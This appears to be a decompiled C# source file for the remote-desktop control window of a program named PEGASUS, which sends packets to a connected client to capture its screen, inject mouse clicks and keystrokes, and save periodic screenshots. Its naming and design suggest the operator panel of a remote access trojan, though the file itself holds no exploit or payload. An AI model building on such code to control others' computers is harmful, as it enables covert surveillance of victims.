using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using IcarusLib;
using PEGASUS.Diadyktio;
using PEGASUS.IcarusLib.Metafora_Eikonas;
using PEGASUS.Metafora_Dedomenon;

namespace PEGASUS.Design
{
	public class FormRemoteDesktop : Form
	{
		private readonly List<Keys> _keysPressed;

		public IUnsafeCodec decoder = new UnsafeStreamCodec(60);

		public int FPS;

		private bool isKeyboard;

		private bool isMouse;

		public Size rdSize;

		public Stopwatch sw = Stopwatch.StartNew();

		public object syncPicbox = new object();

		private IContainer components;

		public PictureBox pictureBox1;

		public System.Windows.Forms.Timer timer1;

		private Label label1;

		private Label label2;

		private System.Windows.Forms.Timer timerSave;

		public Label labelWait;

		private Guna2GradientButton button1;

		private Guna2NumericUpDown numericUpDown1;

		private Guna2GradientButton btnKeyboard;

		private Guna2GradientButton btnMouse;

		private Guna2GradientButton btnSave;

		private Guna2PictureBox guna2PictureBox1;

		public Guna2NumericUpDown numericUpDown2;

		private PictureBox pictureBox2;

		private Guna2Separator guna2Separator1;

		private Guna2BorderlessForm guna2BorderlessForm1;

		private Guna2ShadowForm guna2ShadowForm1;

		public PEGASUS_M F { get; set; }

		internal Clients ParentClient { get; set; }

		internal Clients Client { get; set; }

		public string FullPath { get; set; }

		public Image GetImage { get; set; }

		public FormRemoteDesktop()
		{
			_keysPressed = new List<Keys>();
			InitializeComponent();
		}

		private void timer1_Tick(object sender, EventArgs e)
		{
			try
			{
				if (!ParentClient.TcpClient.Connected || !Client.TcpClient.Connected)
				{
					Close();
				}
			}
			catch
			{
				Close();
			}
		}

		private void FormRemoteDesktop_Load(object sender, EventArgs e)
		{
			try
			{
				button1.Tag = "stop";
			}
			catch
			{
			}
		}

		private void Button1_Click(object sender, EventArgs e)
		{
			if (button1.Tag == "play")
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "remoteDesktop";
				msgPack.ForcePathObject("Option").AsString = "capture";
				msgPack.ForcePathObject("Quality").AsInteger = Convert.ToInt32(numericUpDown1.Value.ToString());
				msgPack.ForcePathObject("Screen").AsInteger = Convert.ToInt32(numericUpDown2.Value.ToString());
				decoder = new UnsafeStreamCodec(Convert.ToInt32(numericUpDown1.Value));
				ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
				numericUpDown1.Enabled = false;
				numericUpDown2.Enabled = false;
				btnSave.Enabled = true;
				btnMouse.Enabled = true;
				button1.Tag = "stop";
			}
			else
			{
				button1.Tag = "play";
				try
				{
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "remoteDesktop";
					msgPack2.ForcePathObject("Option").AsString = "stop";
					ThreadPool.QueueUserWorkItem(Client.Send, msgPack2.Encode2Bytes());
				}
				catch
				{
				}
				numericUpDown1.Enabled = true;
				numericUpDown2.Enabled = true;
				btnSave.Enabled = false;
				btnMouse.Enabled = false;
			}
		}

		private void BtnSave_Click(object sender, EventArgs e)
		{
			if (button1.Tag != "stop")
			{
				return;
			}
			if (timerSave.Enabled)
			{
				timerSave.Stop();
				return;
			}
			timerSave.Start();
			try
			{
				if (!Directory.Exists(FullPath))
				{
					Directory.CreateDirectory(FullPath);
				}
				Process.Start(FullPath);
			}
			catch
			{
			}
		}

		private void TimerSave_Tick(object sender, EventArgs e)
		{
			try
			{
				if (!Directory.Exists(FullPath))
				{
					Directory.CreateDirectory(FullPath);
				}
				Encoder quality = Encoder.Quality;
				EncoderParameters encoderParameters = new EncoderParameters(1);
				EncoderParameter encoderParameter = new EncoderParameter(quality, 50L);
				encoderParameters.Param[0] = encoderParameter;
				ImageCodecInfo encoder = GetEncoder(ImageFormat.Jpeg);
				pictureBox1.Image.Save(FullPath + "\\IMG_" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".jpeg", encoder, encoderParameters);
				encoderParameters?.Dispose();
				encoderParameter?.Dispose();
			}
			catch
			{
			}
		}

		private ImageCodecInfo GetEncoder(ImageFormat format)
		{
			ImageCodecInfo[] imageDecoders = ImageCodecInfo.GetImageDecoders();
			foreach (ImageCodecInfo imageCodecInfo in imageDecoders)
			{
				if (imageCodecInfo.FormatID == format.Guid)
				{
					return imageCodecInfo;
				}
			}
			return null;
		}

		private void PictureBox1_MouseDown(object sender, MouseEventArgs e)
		{
			try
			{
				if (button1.Tag == "stop" && pictureBox1.Image != null && pictureBox1.ContainsFocus && isMouse)
				{
					Point point = new Point(e.X * rdSize.Width / pictureBox1.Width, e.Y * rdSize.Height / pictureBox1.Height);
					int num = 0;
					if (e.Button == MouseButtons.Left)
					{
						num = 2;
					}
					if (e.Button == MouseButtons.Right)
					{
						num = 8;
					}
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "remoteDesktop";
					msgPack.ForcePathObject("Option").AsString = "mouseClick";
					msgPack.ForcePathObject("X").AsInteger = point.X;
					msgPack.ForcePathObject("Y").AsInteger = point.Y;
					msgPack.ForcePathObject("Button").AsInteger = num;
					ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
				}
			}
			catch
			{
			}
		}

		private void PictureBox1_MouseUp(object sender, MouseEventArgs e)
		{
			try
			{
				if (button1.Tag == "stop" && pictureBox1.Image != null && pictureBox1.ContainsFocus && isMouse)
				{
					Point point = new Point(e.X * rdSize.Width / pictureBox1.Width, e.Y * rdSize.Height / pictureBox1.Height);
					int num = 0;
					if (e.Button == MouseButtons.Left)
					{
						num = 4;
					}
					if (e.Button == MouseButtons.Right)
					{
						num = 16;
					}
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "remoteDesktop";
					msgPack.ForcePathObject("Option").AsString = "mouseClick";
					msgPack.ForcePathObject("X").AsInteger = point.X;
					msgPack.ForcePathObject("Y").AsInteger = point.Y;
					msgPack.ForcePathObject("Button").AsInteger = num;
					ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
				}
			}
			catch
			{
			}
		}

		private void pictureBox1_MouseMove(object sender, MouseEventArgs e)
		{
			try
			{
				if (button1.Tag == "stop" && pictureBox1.Image != null && pictureBox1.ContainsFocus && isMouse)
				{
					Point point = new Point(e.X * rdSize.Width / pictureBox1.Width, e.Y * rdSize.Height / pictureBox1.Height);
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "remoteDesktop";
					msgPack.ForcePathObject("Option").AsString = "mouseMove";
					msgPack.ForcePathObject("X").AsInteger = point.X;
					msgPack.ForcePathObject("Y").AsInteger = point.Y;
					ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
				}
			}
			catch
			{
			}
		}

		private void Button3_Click(object sender, EventArgs e)
		{
			if (isMouse)
			{
				isMouse = false;
			}
			else
			{
				isMouse = true;
			}
			pictureBox1.Focus();
		}

		private void FormRemoteDesktop_FormClosed(object sender, FormClosedEventArgs e)
		{
			try
			{
				GetImage?.Dispose();
				ThreadPool.QueueUserWorkItem(delegate
				{
					Client?.Disconnected();
				});
			}
			catch
			{
			}
		}

		private void btnKeyboard_Click(object sender, EventArgs e)
		{
			if (isKeyboard)
			{
				isKeyboard = false;
			}
			else
			{
				isKeyboard = true;
			}
			pictureBox1.Focus();
		}

		private void FormRemoteDesktop_KeyDown(object sender, KeyEventArgs e)
		{
			if (button1.Tag == "stop" && pictureBox1.Image != null && pictureBox1.ContainsFocus && isKeyboard)
			{
				if (!IsLockKey(e.KeyCode))
				{
					e.Handled = true;
				}
				if (!_keysPressed.Contains(e.KeyCode))
				{
					_keysPressed.Add(e.KeyCode);
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "remoteDesktop";
					msgPack.ForcePathObject("Option").AsString = "keyboardClick";
					msgPack.ForcePathObject("key").AsInteger = Convert.ToInt32(e.KeyCode);
					msgPack.ForcePathObject("keyIsDown").SetAsBoolean(bVal: true);
					ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
				}
			}
		}

		private void FormRemoteDesktop_KeyUp(object sender, KeyEventArgs e)
		{
			if (button1.Tag == "stop" && pictureBox1.Image != null && base.ContainsFocus && isKeyboard)
			{
				if (!IsLockKey(e.KeyCode))
				{
					e.Handled = true;
				}
				_keysPressed.Remove(e.KeyCode);
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "remoteDesktop";
				msgPack.ForcePathObject("Option").AsString = "keyboardClick";
				msgPack.ForcePathObject("key").AsInteger = Convert.ToInt32(e.KeyCode);
				msgPack.ForcePathObject("keyIsDown").SetAsBoolean(bVal: false);
				ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
			}
		}

		private bool IsLockKey(Keys key)
		{
			if ((key & Keys.Capital) != Keys.Capital && (key & Keys.NumLock) != Keys.NumLock)
			{
				return (key & Keys.Scroll) == Keys.Scroll;
			}
			return true;
		}

		[DllImport("user32.DLL")]
		private static extern void ReleaseCapture();

		[DllImport("user32.DLL")]
		private static extern void SendMessage(IntPtr hwnd, int wmsg, int wparam, int lparam);

		private void guna2Panel1_MouseDown(object sender, MouseEventArgs e)
		{
			ReleaseCapture();
			SendMessage(base.Handle, 274, 61458, 0);
		}

		private void guna2PictureBox1_Click(object sender, EventArgs e)
		{
			Close();
		}

		private void guna2Separator1_Click(object sender, EventArgs e)
		{
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
			base.Dispose(disposing);
		}

		private void InitializeComponent()
		{
			components = new System.ComponentModel.Container();
			System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(FormRemoteDesktop));
			pictureBox1 = new System.Windows.Forms.PictureBox();
			timer1 = new System.Windows.Forms.Timer(components);
			pictureBox2 = new System.Windows.Forms.PictureBox();
			guna2PictureBox1 = new Guna.UI2.WinForms.Guna2PictureBox();
			btnKeyboard = new Guna.UI2.WinForms.Guna2GradientButton();
			btnMouse = new Guna.UI2.WinForms.Guna2GradientButton();
			btnSave = new Guna.UI2.WinForms.Guna2GradientButton();
			numericUpDown2 = new Guna.UI2.WinForms.Guna2NumericUpDown();
			numericUpDown1 = new Guna.UI2.WinForms.Guna2NumericUpDown();
			button1 = new Guna.UI2.WinForms.Guna2GradientButton();
			label2 = new System.Windows.Forms.Label();
			label1 = new System.Windows.Forms.Label();
			guna2Separator1 = new Guna.UI2.WinForms.Guna2Separator();
			timerSave = new System.Windows.Forms.Timer(components);
			labelWait = new System.Windows.Forms.Label();
			guna2BorderlessForm1 = new Guna.UI2.WinForms.Guna2BorderlessForm(components);
			guna2ShadowForm1 = new Guna.UI2.WinForms.Guna2ShadowForm(components);
			((System.ComponentModel.ISupportInitialize)pictureBox1).BeginInit();
			((System.ComponentModel.ISupportInitialize)pictureBox2).BeginInit();
			((System.ComponentModel.ISupportInitialize)guna2PictureBox1).BeginInit();
			((System.ComponentModel.ISupportInitialize)numericUpDown2).BeginInit();
			((System.ComponentModel.ISupportInitialize)numericUpDown1).BeginInit();
			SuspendLayout();
			pictureBox1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
			pictureBox1.Location = new System.Drawing.Point(11, 85);
			pictureBox1.Margin = new System.Windows.Forms.Padding(2);
			pictureBox1.Name = "pictureBox1";
			pictureBox1.Size = new System.Drawing.Size(889, 513);
			pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
			pictureBox1.TabIndex = 0;
			pictureBox1.TabStop = false;
			pictureBox1.MouseDown += new System.Windows.Forms.MouseEventHandler(PictureBox1_MouseDown);
			pictureBox1.MouseMove += new System.Windows.Forms.MouseEventHandler(pictureBox1_MouseMove);
			pictureBox1.MouseUp += new System.Windows.Forms.MouseEventHandler(PictureBox1_MouseUp);
			timer1.Interval = 2000;
			timer1.Tick += new System.EventHandler(timer1_Tick);
			pictureBox2.Image = (System.Drawing.Image)resources.GetObject("pictureBox2.Image");
			pictureBox2.Location = new System.Drawing.Point(12, 12);
			pictureBox2.Name = "pictureBox2";
			pictureBox2.Size = new System.Drawing.Size(40, 42);
			pictureBox2.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
			pictureBox2.TabIndex = 148;
			pictureBox2.TabStop = false;
			guna2PictureBox1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			guna2PictureBox1.BackColor = System.Drawing.Color.Transparent;
			guna2PictureBox1.Image = (System.Drawing.Image)resources.GetObject("guna2PictureBox1.Image");
			guna2PictureBox1.ImageRotate = 0f;
			guna2PictureBox1.Location = new System.Drawing.Point(871, 12);
			guna2PictureBox1.Name = "guna2PictureBox1";
			guna2PictureBox1.Size = new System.Drawing.Size(29, 27);
			guna2PictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
			guna2PictureBox1.TabIndex = 147;
			guna2PictureBox1.TabStop = false;
			guna2PictureBox1.UseTransparentBackground = true;
			guna2PictureBox1.Click += new System.EventHandler(guna2PictureBox1_Click);
			btnKeyboard.BorderColor = System.Drawing.Color.FromArgb(42, 42, 42);
			btnKeyboard.BorderThickness = 1;
			btnKeyboard.CustomBorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			btnKeyboard.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
			btnKeyboard.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
			btnKeyboard.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
			btnKeyboard.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
			btnKeyboard.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
			btnKeyboard.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			btnKeyboard.FillColor2 = System.Drawing.Color.FromArgb(36, 36, 36);
			btnKeyboard.Font = new System.Drawing.Font("Electrolize", 9f);
			btnKeyboard.ForeColor = System.Drawing.Color.White;
			btnKeyboard.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
			btnKeyboard.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
			btnKeyboard.HoverState.CustomBorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
			btnKeyboard.HoverState.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			btnKeyboard.HoverState.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			btnKeyboard.HoverState.ForeColor = System.Drawing.Color.FromArgb(191, 37, 33);
			btnKeyboard.Location = new System.Drawing.Point(208, 41);
			btnKeyboard.Name = "btnKeyboard";
			btnKeyboard.Size = new System.Drawing.Size(133, 30);
			btnKeyboard.TabIndex = 146;
			btnKeyboard.Text = "Keyboard On/Off";
			btnKeyboard.Click += new System.EventHandler(btnKeyboard_Click);
			btnMouse.BorderColor = System.Drawing.Color.FromArgb(42, 42, 42);
			btnMouse.BorderThickness = 1;
			btnMouse.CustomBorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			btnMouse.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
			btnMouse.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
			btnMouse.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
			btnMouse.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
			btnMouse.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
			btnMouse.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			btnMouse.FillColor2 = System.Drawing.Color.FromArgb(36, 36, 36);
			btnMouse.Font = new System.Drawing.Font("Electrolize", 9f);
			btnMouse.ForeColor = System.Drawing.Color.White;
			btnMouse.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
			btnMouse.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
			btnMouse.HoverState.CustomBorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
			btnMouse.HoverState.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			btnMouse.HoverState.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			btnMouse.HoverState.ForeColor = System.Drawing.Color.FromArgb(191, 37, 33);
			btnMouse.Location = new System.Drawing.Point(70, 41);
			btnMouse.Name = "btnMouse";
			btnMouse.Size = new System.Drawing.Size(133, 30);
			btnMouse.TabIndex = 145;
			btnMouse.Text = "Mouse On/Off";
			btnMouse.Click += new System.EventHandler(Button3_Click);
			btnSave.BorderColor = System.Drawing.Color.FromArgb(42, 42, 42);
			btnSave.BorderThickness = 1;
			btnSave.CustomBorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			btnSave.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
			btnSave.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
			btnSave.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
			btnSave.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
			btnSave.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
			btnSave.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			btnSave.FillColor2 = System.Drawing.Color.FromArgb(36, 36, 36);
			btnSave.Font = new System.Drawing.Font("Electrolize", 9f);
			btnSave.ForeColor = System.Drawing.Color.White;
			btnSave.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
			btnSave.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
			btnSave.HoverState.CustomBorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
			btnSave.HoverState.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			btnSave.HoverState.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			btnSave.HoverState.ForeColor = System.Drawing.Color.FromArgb(191, 37, 33);
			btnSave.Location = new System.Drawing.Point(208, 8);
			btnSave.Name = "btnSave";
			btnSave.Size = new System.Drawing.Size(133, 30);
			btnSave.TabIndex = 144;
			btnSave.Text = "Capture On/Off";
			btnSave.Click += new System.EventHandler(BtnSave_Click);
			numericUpDown2.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			numericUpDown2.BackColor = System.Drawing.Color.Transparent;
			numericUpDown2.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
			numericUpDown2.Cursor = System.Windows.Forms.Cursors.IBeam;
			numericUpDown2.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
			numericUpDown2.Font = new System.Drawing.Font("Electrolize", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			numericUpDown2.ForeColor = System.Drawing.Color.LightGray;
			numericUpDown2.Increment = new decimal(new int[4] { 10, 0, 0, 0 });
			numericUpDown2.Location = new System.Drawing.Point(792, 44);
			numericUpDown2.Maximum = new decimal(new int[4]);
			numericUpDown2.Name = "numericUpDown2";
			numericUpDown2.Size = new System.Drawing.Size(56, 25);
			numericUpDown2.TabIndex = 143;
			numericUpDown2.UpDownButtonFillColor = System.Drawing.Color.FromArgb(191, 37, 33);
			numericUpDown2.UpDownButtonForeColor = System.Drawing.Color.White;
			numericUpDown1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			numericUpDown1.BackColor = System.Drawing.Color.Transparent;
			numericUpDown1.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
			numericUpDown1.Cursor = System.Windows.Forms.Cursors.IBeam;
			numericUpDown1.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
			numericUpDown1.Font = new System.Drawing.Font("Electrolize", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			numericUpDown1.ForeColor = System.Drawing.Color.LightGray;
			numericUpDown1.Location = new System.Drawing.Point(664, 44);
			numericUpDown1.Minimum = new decimal(new int[4] { 30, 0, 0, 0 });
			numericUpDown1.Name = "numericUpDown1";
			numericUpDown1.Size = new System.Drawing.Size(56, 25);
			numericUpDown1.TabIndex = 142;
			numericUpDown1.UpDownButtonFillColor = System.Drawing.Color.FromArgb(191, 37, 33);
			numericUpDown1.UpDownButtonForeColor = System.Drawing.Color.White;
			numericUpDown1.Value = new decimal(new int[4] { 30, 0, 0, 0 });
			button1.BorderColor = System.Drawing.Color.FromArgb(42, 42, 42);
			button1.BorderThickness = 1;
			button1.CustomBorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			button1.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
			button1.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
			button1.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
			button1.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
			button1.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
			button1.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			button1.FillColor2 = System.Drawing.Color.FromArgb(36, 36, 36);
			button1.Font = new System.Drawing.Font("Electrolize", 9f);
			button1.ForeColor = System.Drawing.Color.White;
			button1.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
			button1.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
			button1.HoverState.CustomBorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
			button1.HoverState.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			button1.HoverState.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			button1.HoverState.ForeColor = System.Drawing.Color.FromArgb(191, 37, 33);
			button1.Location = new System.Drawing.Point(70, 7);
			button1.Name = "button1";
			button1.Size = new System.Drawing.Size(133, 30);
			button1.TabIndex = 141;
			button1.Text = "Start/Stop";
			button1.Click += new System.EventHandler(Button1_Click);
			label2.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			label2.AutoSize = true;
			label2.Location = new System.Drawing.Point(744, 55);
			label2.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
			label2.Name = "label2";
			label2.Size = new System.Drawing.Size(41, 13);
			label2.TabIndex = 4;
			label2.Text = "Screen";
			label1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			label1.AutoSize = true;
			label1.Location = new System.Drawing.Point(617, 55);
			label1.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
			label1.Name = "label1";
			label1.Size = new System.Drawing.Size(39, 13);
			label1.TabIndex = 2;
			label1.Text = "Quality";
			guna2Separator1.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
			guna2Separator1.BackColor = System.Drawing.Color.Transparent;
			guna2Separator1.FillColor = System.Drawing.Color.FromArgb(36, 36, 36);
			guna2Separator1.Location = new System.Drawing.Point(-280, 79);
			guna2Separator1.Name = "guna2Separator1";
			guna2Separator1.Size = new System.Drawing.Size(1504, 10);
			guna2Separator1.TabIndex = 149;
			guna2Separator1.UseTransparentBackground = true;
			guna2Separator1.Click += new System.EventHandler(guna2Separator1_Click);
			timerSave.Interval = 1500;
			timerSave.Tick += new System.EventHandler(TimerSave_Tick);
			labelWait.AutoSize = true;
			labelWait.Font = new System.Drawing.Font("Electrolize", 12f);
			labelWait.Location = new System.Drawing.Point(264, 150);
			labelWait.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
			labelWait.Name = "labelWait";
			labelWait.Size = new System.Drawing.Size(51, 19);
			labelWait.TabIndex = 3;
			labelWait.Text = "Wait...";
			guna2BorderlessForm1.ContainerControl = this;
			guna2BorderlessForm1.DockIndicatorTransparencyValue = 0.6;
			guna2BorderlessForm1.ShadowColor = System.Drawing.Color.FromArgb(191, 37, 33);
			guna2BorderlessForm1.TransparentWhileDrag = true;
			guna2ShadowForm1.ShadowColor = System.Drawing.Color.FromArgb(191, 37, 33);
			guna2ShadowForm1.TargetForm = this;
			base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
			base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
			BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			base.ClientSize = new System.Drawing.Size(912, 609);
			base.Controls.Add(pictureBox2);
			base.Controls.Add(labelWait);
			base.Controls.Add(guna2PictureBox1);
			base.Controls.Add(btnKeyboard);
			base.Controls.Add(pictureBox1);
			base.Controls.Add(btnMouse);
			base.Controls.Add(guna2Separator1);
			base.Controls.Add(btnSave);
			base.Controls.Add(numericUpDown2);
			base.Controls.Add(label1);
			base.Controls.Add(numericUpDown1);
			base.Controls.Add(label2);
			base.Controls.Add(button1);
			ForeColor = System.Drawing.Color.LightGray;
			base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
			base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
			base.KeyPreview = true;
			base.Margin = new System.Windows.Forms.Padding(2);
			MinimumSize = new System.Drawing.Size(442, 300);
			base.Name = "FormRemoteDesktop";
			Text = "Remote Desktop";
			base.FormClosed += new System.Windows.Forms.FormClosedEventHandler(FormRemoteDesktop_FormClosed);
			base.Load += new System.EventHandler(FormRemoteDesktop_Load);
			base.KeyDown += new System.Windows.Forms.KeyEventHandler(FormRemoteDesktop_KeyDown);
			base.KeyUp += new System.Windows.Forms.KeyEventHandler(FormRemoteDesktop_KeyUp);
			((System.ComponentModel.ISupportInitialize)pictureBox1).EndInit();
			((System.ComponentModel.ISupportInitialize)pictureBox2).EndInit();
			((System.ComponentModel.ISupportInitialize)guna2PictureBox1).EndInit();
			((System.ComponentModel.ISupportInitialize)numericUpDown2).EndInit();
			((System.ComponentModel.ISupportInitialize)numericUpDown1).EndInit();
			ResumeLayout(false);
			PerformLayout();
		}
	}
}
